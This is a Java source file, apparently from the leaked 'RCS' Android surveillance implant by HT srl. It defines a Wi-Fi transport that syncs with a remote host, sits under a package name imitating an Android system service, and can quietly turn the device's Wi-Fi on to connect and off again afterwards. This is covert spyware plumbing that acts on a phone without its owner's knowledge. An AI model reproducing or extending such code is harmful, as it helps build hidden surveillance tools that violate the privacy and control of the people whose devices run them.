/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : WifiTransport.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service.action.sync;

import android.content.Context;
import android.net.wifi.WifiManager;

import com.android.service.Device;
import com.android.service.Status;
import com.android.service.auto.Cfg;
import com.android.service.util.Check;

/**
 * The Class WifiTransport.
 */
public class WifiTransport extends HttpKeepAliveTransport {
	private static final String TAG = "WifiTransport"; //$NON-NLS-1$
	/** The forced. */
	private boolean forced;
	private boolean switchedOn;

	final String service = Context.WIFI_SERVICE;
	final WifiManager wifi = (WifiManager) Status.getAppContext().getSystemService(service);

	/**
	 * Instantiates a new wifi transport.
	 * 
	 * @param host
	 *            the host
	 */
	public WifiTransport(final String host) {
		super(host);
	}

	/**
	 * Instantiates a new wifi transport.
	 * 
	 * @param host
	 *            the host
	 * @param wifiForced
	 *            the wifi forced
	 */
	public WifiTransport(final String host, final boolean wifiForced) {
		super(host);
		this.forced = wifiForced;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.action.sync.Transport#isAvailable()
	 */
	@Override
	public boolean isAvailable() {

		boolean available = wifi.isWifiEnabled();
		if (!wifi.isWifiEnabled()) {
			if (forced && wifi.getWifiState() != WifiManager.WIFI_STATE_ENABLING) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " try to enable wifi") ;//$NON-NLS-1$
				}
				available = wifi.setWifiEnabled(true);
				switchedOn = available;
			}
		}

		if (Device.self().isSimulator()) {
			return true;
		}

		return available;
	}

	@Override
	public void close() {
		super.close();
		if (switchedOn) {
			final WifiManager wifi = (WifiManager) Status.getAppContext().getSystemService(service);
			wifi.setWifiEnabled(false);
			switchedOn = false;
		}
	}

}
